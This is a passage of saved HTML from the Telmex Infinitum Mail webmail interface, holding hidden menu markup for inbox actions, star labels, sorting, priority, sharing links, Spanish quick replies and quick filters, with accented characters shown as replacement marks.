        <a href="http://telmex.com/web/hogar/infinitum-mail" style="display:none" target="_blank" class="menulink"><img
                class="postLoadIMG" data-url="../../app/ress/theme/Telmex/IMG/paginaWeb.png" style="padding-left:6px"
                src="https://www.infinitummail.com/app/" width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;P�gina web</a>
        <div class="MSLine"></div>
        <a href="http://telmex.com/web/asistencia/guia-nuevo-infinitum-mail" target="_blank" class="menulink"><img
                class="postLoadIMG" data-url="../../app/ress/theme/Telmex/IMG/books-20.png" style="padding-left:6px"
                src="https://www.infinitummail.com/app/" width="20px" height="20px" alt="">&nbsp;&nbsp;&nbsp;<span
                style="">Gu�as<sup style="color:#C5203E"> Nuevo</sup></span></a>
    </div>


    <!-- mail -->
    <div id="mCheckBoxOptions" style="display:none">
        <a href="JavaScript:CheckBoxOpt(&#39;All&#39;)" class="menulink">&nbsp;Todo</a>
        <a href="JavaScript:CheckBoxOpt(&#39;None&#39;)" class="menulink">&nbsp;Nada</a>
        <a href="JavaScript:CheckBoxOpt(&#39;Read&#39;)" class="menulink">&nbsp;Leer</a>
        <a href="JavaScript:CheckBoxOpt(&#39;Unread&#39;)" class="menulink">&nbsp;No le�do</a>
        <div class="MSLine"></div>
        <a href="JavaScript:CheckBoxOpt(&#39;HPriority&#39;)" class="menulink">&nbsp;Alta prioridad</a>
        <a href="JavaScript:CheckBoxOpt(&#39;LPriority&#39;)" class="menulink">&nbsp;Baja prioridad</a>
        <div class="MSLine"></div>
        <a href="JavaScript:CheckBoxOpt(&#39;Starred&#39;)" class="menulink">&nbsp;Destacado</a>
        <a href="JavaScript:CheckBoxOpt(&#39;Unstarred&#39;)" class="menulink">&nbsp;No destacado</a>
        <div class="MSLine"></div>
        <a href="JavaScript:CheckBoxOpt(&#39;Replied&#39;)" class="menulink">&nbsp;Contestado</a>
        <a href="JavaScript:CheckBoxOpt(&#39;Forwarded&#39;)" class="menulink">&nbsp;Reenviado</a>
        <div class="MSLine"></div>
        <a href="JavaScript:CheckBoxOpt(&#39;Attachment&#39;)" class="menulink">&nbsp;Tiene adjunto</a>
    </div>

    <div id="mInboxMoreOptions" style="display:none">
        <a href="JavaScript:fnMarkAll(&#39;read&#39;)" id="mInboxMoreOptionsMarkAll" class="menulink">&nbsp;Marcar todos
            como le�dos</a>
        <div class="MSLine"></div>
        <a href="JavaScript:AC(9)" id="mInboxMoreOptionsBlockDel" class="menulink">&nbsp;Bloquear y borrar</a>
        <a href="JavaScript:RCM(5)" style="display:none" class="menulink">&nbsp;Borrar permanentemente</a>
    </div>

    <div id="mInboxMoreOptionsNM" style="display:none">
        <a href="JavaScript:fnMarkAll(&#39;read&#39;)" id="mInboxMoreOptionsMarkAll" class="menulink">&nbsp;Marcar todos
            como le�dos</a>
    </div>

    <div id="mInboxStarPOPOptt" style="display:none">
        <!-- uad_korney imap begin -->
        <a class="menulink" id="InboxStarPOPOpttRed" href="JavaScript:fnAddStarBulk(1)"><img class="postLoadIMG"
                                                                                             data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_red.png"
                                                                                             src="https://www.infinitummail.com/app/"
                                                                                             width="16px" height="15px"
                                                                                             alt=""></a>
        <a class="menulink" href="JavaScript:fnAddStarBulk(2)"><img class="postLoadIMG"
                                                                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_yellow.png"
                                                                    src="https://www.infinitummail.com/app/"
                                                                    width="16px" height="15px" alt=""></a>
        <a class="menulink" id="InboxStarPOPOpttGreen" href="JavaScript:fnAddStarBulk(3)"><img class="postLoadIMG"
                                                                                               data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_green.png"
                                                                                               src="https://www.infinitummail.com/app/"
                                                                                               width="16px"
                                                                                               height="15px" alt=""></a>
        <a class="menulink" id="InboxStarPOPOpttBlue" href="JavaScript:fnAddStarBulk(4)"><img class="postLoadIMG"
                                                                                              data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_blue.png"
                                                                                              src="https://www.infinitummail.com/app/"
                                                                                              width="16px" height="15px"
                                                                                              alt=""></a>
        <a class="menulink" href="JavaScript:fnAddStarBulk(0)"><img class="postLoadIMG"
                                                                    data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_off.png"
                                                                    src="https://www.infinitummail.com/app/"
                                                                    width="16px" height="15px" alt=""></a>
        <!-- uad_korney imap end -->
    </div>

    <div id="mInboxcontextmenu" style="display:none">
        <a href="JavaScript:fnInboxContextAC(0)" class="menulink">&nbsp;Abrir</a>
        <a href="JavaScript:fnInboxContextAC(1)" class="menulink">&nbsp;Contestar</a>
        <a href="JavaScript:fnInboxContextAC(2)" class="menulink">&nbsp;Contestar a todos</a>
        <a href="JavaScript:fnInboxContextAC(3)" class="menulink">&nbsp;Reenviar</a>
        <div class="MSLine"></div>
        <a href="JavaScript:AC(2)" id="mInboxcontextmenu_read" class="menulink">&nbsp;Marcar como le�do</a>
        <a href="JavaScript:AC(3)" id="mInboxcontextmenu_unread" class="menulink">&nbsp;Marcado como no le�do</a>
        <div class="MSLine"></div>
        <!-- uad_korney imap begin -->
        <a id="InboxContextMenuBlock" href="JavaScript:AC(1)" class="menulink">&nbsp;Bloquear</a>
        <!-- uad_korney imap end -->
        <a href="JavaScript:AC(0)" class="menulink">&nbsp;Borrar</a>
    </div>

    <div id="mInboxShortcontextmenu" style="display:none">
        <a href="JavaScript:AC(2)" class="menulink">&nbsp;Marcar como le�do</a>
        <a href="JavaScript:AC(3)" class="menulink">&nbsp;Marcado como no le�do</a>
        <div class="MSLine"></div>
        <!-- uad_korney imap begin -->
        <a id="InboxShortContextMenuBlock" href="JavaScript:AC(1)" class="menulink">&nbsp;Bloquear</a>
        <!-- uad_korney imap end -->
        <a href="JavaScript:AC(0)" class="menulink">&nbsp;Borrar</a>
    </div>


    <div id="mInboxMiniStars" style="display:none; height:20px">
        <!-- uad_korney imap begin -->
        <a id="mInboxMiniStarRed" class="menulinkminiStart" href="JavaScript:fnAddStar(1)"><img class="postLoadIMG"
                                                                                                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_red.png"
                                                                                                src="https://www.infinitummail.com/app/"
                                                                                                width="16px"
                                                                                                height="15px"
                                                                                                alt=""></a>
        <a class="menulinkminiStart" href="JavaScript:fnAddStar(2)"><img class="postLoadIMG"
                                                                         data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_yellow.png"
                                                                         src="https://www.infinitummail.com/app/"
                                                                         width="16px" height="15px" alt=""></a>
        <a id="mInboxMiniStarGreen" class="menulinkminiStart" href="JavaScript:fnAddStar(3)"><img class="postLoadIMG"
                                                                                                  data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_green.png"
                                                                                                  src="https://www.infinitummail.com/app/"
                                                                                                  width="16px"
                                                                                                  height="15px" alt=""></a>
        <a id="mInboxMiniStarBlue" class="menulinkminiStart" href="JavaScript:fnAddStar(4)"><img class="postLoadIMG"
                                                                                                 data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_blue.png"
                                                                                                 src="https://www.infinitummail.com/app/"
                                                                                                 width="16px"
                                                                                                 height="15px"
                                                                                                 alt=""></a>
        <!-- uad_korney imap end -->
        <a class="menulinkminiStart" href="JavaScript:fnAddStar(0)"><img class="postLoadIMG"
                                                                         data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/star_off.png"
                                                                         src="https://www.infinitummail.com/app/"
                                                                         width="16px" height="15px" alt=""></a>
    </div>


    <div id="mInboxbtnArrangeBy" style="display:none">
        <a href="JavaScript:HSort(&#39;Received&#39;, false)" class="menulink"><img id="icoSortReceived"
                                                                                    src="https://www.infinitummail.com/app/"
                                                                                    width="16px" height="16px" alt="">&nbsp;Fecha</a>
        <a href="JavaScript:HSort(&#39;Read&#39;, false)" class="menulink"><img id="icoSortRead"
                                                                                src="https://www.infinitummail.com/app/"
                                                                                width="16px" height="16px" alt="">&nbsp;Nuevo</a>
        <a href="JavaScript:HSort(&#39;From&#39;, false)" class="menulink"><img id="icoSortFrom"
                                                                                src="https://www.infinitummail.com/app/"
                                                                                width="16px" height="16px" alt="">&nbsp;De</a>
        <a href="JavaScript:HSort(&#39;Subject&#39;, false)" class="menulink"><img id="icoSortSubject"
                                                                                   src="https://www.infinitummail.com/app/"
                                                                                   width="16px" height="16px" alt="">&nbsp;Asunto</a>
        <a href="JavaScript:HSort(&#39;Followup&#39;, false)" class="menulink"><img id="icoSortFollowup"
                                                                                    src="https://www.infinitummail.com/app/"
                                                                                    width="16px" height="16px" alt="">&nbsp;Estrellas</a>
    </div>

    <div id="mInboxDirsList" style="display:none; overflow"></div>

    <div id="mSpellMenu" style="display:none"></div>

    <div id="mAttahcMenu" style="display:none; overflow-y: auto; overflow-x: hidden"></div>

    <div id="mMsgAttahcMenu" style="display:none;"></div>

    <div id="mContactsAutoCompMenu" style="display:none;"></div>

    <div id="mContactsAutoCompOpt" style="display:none;"></div>

    <div id="mRTEPriorityMenu" style="display:none">
        <a href="JavaScript:m_bManualPriority = true; fnRTEPriority(&#39;2&#39;)" class="menulink"><img
                id="icoRTEPriorityHigh" src="./index_files/trans.png" width="16px" height="16px" alt="">&nbsp;Alto</a>
        <a href="JavaScript:m_bManualPriority = true; fnRTEPriority(&#39;1&#39;)" class="menulink"><img
                id="icoRTEPriorityNormal" src="./index_files/checkmark_icon&amp;16_p.png" width="16px" height="16px"
                alt="">&nbsp;Normal</a>
        <a href="JavaScript:fnRTEPriority(&#39;0&#39;)" class="menulink" style="display:none"><img
                id="icoRTEPriorityLow" src="./index_files/trans.png" width="16px" height="16px" alt="">&nbsp;Bajo</a>
    </div>

    <!-- RTE -->
    <div id="mRTEShare" style="display:none; width:115px">

        <!--
       <a href="JavaScript:fnOpenFacebook()" title="Facebook" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/facebook-3-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenGoogleDrive('youtube')" title="YouTube" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/youtube_icon&32.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <br/>
       <a href="JavaScript:fnOpenInstagram()" title="Instagram" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/instagram.png" src="" width="18px" height="19px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenTumblr()" title="Tumblr" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/tumblr-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <br/>
       <a href="JavaScript:fnOpenDropBox()" title="Dropbox" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/dropbox.png" src="" width="22px" height="20px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenGoogleDrive('drive')" title="Google Drive" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/gdrive.png" src="" width="18px" height="17px" alt="" />&nbsp;</a>
       <br/>
       <a href="JavaScript:fnOpenSkyDrive()" title="OneDrive" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/skydrive.png" src="" width="27px" height="17px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenBox()" title="box" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/box_icon.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenTwitter()" title="Twitter" class="menulink jqTootltip" style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/twitter-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenAmazon()" title="Amazon Cloud Drive" class="menulink jqTootltip" style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/Amazon_drive.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <br>
       <a href="JavaScript:fnOpenflickr()" title="flickr" class="menulink jqTootltip" style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/44-flickr-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenInstagram()" title="Instagram" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/instagram.png" src="" width="18px" height="19px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenTumblr()" title="Tumblr" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/tumblr-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <br/>
       <a href="JavaScript:fnOpenDropBox()" title="Dropbox" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/dropbox.png" src="" width="22px" height="20px" alt="" />&nbsp;</a>
       <br/>
       <a href="JavaScript:fnOpenBox()" title="box" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/box_icon.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       <a href="JavaScript:fnOpenTwitter()" title="Twitter" class="menulink jqTootltip" style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/twitter-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
       -->

        <!--
        <a href="JavaScript:fnOpenSocialApp('facebook')" title="Facebook" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/facebook-3-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp('youtube')" title="YouTube" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/youtube_icon&32.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
        <br/>
        <a href="JavaScript:fnOpenSocialApp('instagram')" title="Instagram" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/instagram.png" src="" width="18px" height="19px" alt="" />&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp('tumblr')" title="Tumblr" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/tumblr-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
        <br/>
        <a href="JavaScript:fnOpenSocialApp('dropbox')" title="Dropbox" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/dropbox.png" src="" width="22px" height="20px" alt="" />&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp('google_drive')" title="Google Drive" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/gdrive.png" src="" width="18px" height="17px" alt="" />&nbsp;</a>
        <br/>
        <a href="JavaScript:fnOpenSocialApp('onedrive')" title="OneDrive" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/skydrive.png" src="" width="27px" height="17px" alt="" />&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp('box')" title="box" class="menulink jqTootltip" style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/box_icon.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp('twitter')" title="Twitter" class="menulink jqTootltip" style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/twitter-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp('amazon_cloud_drive')" title="Amazon Cloud Drive" class="menulink jqTootltip" style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/Amazon_drive.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
        <br>
        <a href="JavaScript:fnOpenSocialApp('flickr')" title="flickr" class="menulink jqTootltip" style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img class="postLoadIMG" data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/44-flickr-24.png" src="" width="24px" height="24px" alt="" />&nbsp;</a>
        -->

        <a href="JavaScript:fnOpenSocialApp(&#39;facebook&#39;)" title="Facebook" class="menulink jqTootltip"
           style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/facebook-3-24.png"
                src="https://www.infinitummail.com/app/" width="24px" height="24px" alt="">&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp(&#39;instagram&#39;)" title="Instagram" class="menulink jqTootltip"
           style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/instagram.png"
                src="https://www.infinitummail.com/app/" width="18px" height="19px" alt="">&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp(&#39;tumblr&#39;)" title="Tumblr" class="menulink jqTootltip"
           style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/tumblr-24.png"
                src="https://www.infinitummail.com/app/" width="24px" height="24px" alt="">&nbsp;</a>
        <br>
        <a href="JavaScript:fnOpenSocialApp(&#39;dropbox&#39;)" title="Dropbox" class="menulink jqTootltip"
           style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/dropbox.png"
                src="https://www.infinitummail.com/app/" width="22px" height="20px" alt="">&nbsp;</a>
        <br>
        <a href="JavaScript:fnOpenSocialApp(&#39;box&#39;)" title="box" class="menulink jqTootltip"
           style="display:inline-block; float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/box_icon.png"
                src="https://www.infinitummail.com/app/" width="24px" height="24px" alt="">&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp(&#39;twitter&#39;)" title="Twitter" class="menulink jqTootltip"
           style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/twitter-24.png"
                src="https://www.infinitummail.com/app/" width="24px" height="24px" alt="">&nbsp;</a>
        <a href="JavaScript:fnOpenSocialApp(&#39;amazon_cloud_drive&#39;)" title="Amazon Cloud Drive"
           class="menulink jqTootltip"
           style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/Amazon_drive.png"
                src="https://www.infinitummail.com/app/" width="24px" height="24px" alt="">&nbsp;</a>
        <br>
        <a href="JavaScript:fnOpenSocialApp(&#39;flickr&#39;)" title="flickr" class="menulink jqTootltip"
           style="float:left; width:35px;padding-right:10px; padding-left:10px; height:24px; line-height:24px; text-align:center"><img
                class="postLoadIMG"
                data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/44-flickr-24.png"
                src="https://www.infinitummail.com/app/" width="24px" height="24px" alt="">&nbsp;</a>

    </div>


    <div id="mQuickResponsesMenu" style="display:none; width:280px">
        <div class="menulink" style=" cursor:default; padding: 5px 21px;  font-weight:bold; font-size: 12px;">&nbsp;Inserte
            una respuesta r�pida
        </div>
        <a href="JavaScript:fnQuickResponses(0)" class="menulink">&nbsp;<span id="sGRDMT0">Si.</span></a>
        <a href="JavaScript:fnQuickResponses(1)" class="menulink">&nbsp;<span id="sGRDMT1">No.</span></a>
        <a href="JavaScript:fnQuickResponses(2)" class="menulink">&nbsp;<span id="sGRDMT2">�Gracias!</span></a>
        <a href="JavaScript:fnQuickResponses(4)" class="menulink">&nbsp;<span
                id="sGRDMT4">Entendido. �Gracias!</span></a>
        <a href="JavaScript:fnQuickResponses(3)" class="menulink">&nbsp;<span id="sGRDMT3">Eso es genial.</span></a>
        <a href="JavaScript:fnQuickResponses(5)" class="menulink">&nbsp;<span
                id="sGRDMT5">Te llamar� despu�s.</span></a>
        <a href="JavaScript:fnQuickResponses(6)" class="menulink">&nbsp;<span id="sGRDMT6">Se me hizo tarde, pero llegar� pronto.</span></a>
        <a href="JavaScript:fnQuickResponses(7)" class="menulink">&nbsp;<span
                id="sGRDMT7">Hablar� contigo pronto.</span></a>
        <a href="JavaScript:fnQuickResponses(8)" class="menulink">&nbsp;<span id="sGRDMT8">Me pondr� en contacto contigo despu�s.</span></a>
        <a href="JavaScript:fnQuickResponses(9)" class="menulink">&nbsp;<span id="sGRDMT9">Por favor ll�mame cuando recibas este correo electr�nico</span></a>
        <a href="JavaScript:fnQuickResponses(10)" class="menulink">&nbsp;<span
                id="sGRDMT10">�Cu�ndo es la reuni�n?</span></a>
        <div id="divCustomResponses" style="display:none">
            <div id="MSLineCustomResponses" class="MSLine"></div>
        </div>
        <div class="MSLine"></div>
        <a href="JavaScript:fnQuickResponseNew()" onclick="event.stopPropagation();" id="sGRDMTNEW" class="menulink"
           style="height:19px; text-align:right">&nbsp;<span>Crear nuevo</span></a>
        <a href="JavaScript:" id="sGRDMTNEWTxt" onclick="event.stopPropagation();" class="menulink"
           style="display:none; height:19px">&nbsp;<input id="sGRDMTNEWTxtBox" onclick="event.stopPropagation();"
                                                          onkeydown="fnQRTREsponseAdd(this,event)"
                                                          placeholder="Escriba una nueva respuesta ..."
                                                          name="sGRDMTNEWTxtBox" type="text"
                                                          style="width:95%; border: 1px #CCCCCC solid"></a>
    </div>

    <div id="mInboxQuickViewMenu" style="display:none">

        <table style="width: 100%">
            <tbody>
            <tr>
                <td valign="top">
                    <div class="menulink"
                         style=" cursor:default; padding: 5px 21px;  font-weight:bold; font-size: 13px;">&nbsp;Filtros
                        R�pidos
                    </div>
                    <a href="JavaScript:fnOpenInboxQickView(8)" onmouseover="fnQTitleInboxQickView(8,true)"
                       onmouseleave="fnQTitleInboxQickView(7,false)" qtitle="" onclick="event.stopPropagation();"
                       class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="8"
                                                   id="QInboxViewChkImg8"
                                                   style="vertical-align:middle; padding-right:5px;"
                                                   src="./index_files/small_checkmark.png"><span id="InboxQView8">Para m�</span></a>
                    <a href="JavaScript:fnOpenInboxQickView(7)" onmouseover="fnQTitleInboxQickView(7,true)"
                       onmouseleave="fnQTitleInboxQickView(8,false)" onclick="event.stopPropagation();"
                       class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="7"
                                                   id="QInboxViewChkImg7"
                                                   style="vertical-align:middle; padding-right:5px;"
                                                   src="./index_files/trans.png"><span
                            id="InboxQView7">yo incluido</span></a>
                    <div id="QickViewsBETA">
                        <div id="MSLineCustomResponses" class="MSLine"></div>
                        <a href="JavaScript:fnOpenInboxQickView(12)" onmouseover="fnQTitleInboxQickView(12,true)"
                           onmouseleave="fnQTitleInboxQickView(12,false)" onclick="event.stopPropagation();"
                           class="menulink">&nbsp;<img width="16px" height="16px" class="QInboxViewChk" qvindex="12"
                                                       id="QInboxViewChkImg12"
                                                       style="vertical-align:middle; padding-right:5px;"
                                                       src="./index_files/trans.png"><span id="InboxQView12">Nota personal</span></a>
                        <a href="JavaScript:fnOpenInboxQickView(13)" onmouseover="fnQTitleInboxQickView(13,true)"
                           onmouseleave="fnQTitleInboxQickView(13,false)" onclick="event.stopPropagation();"
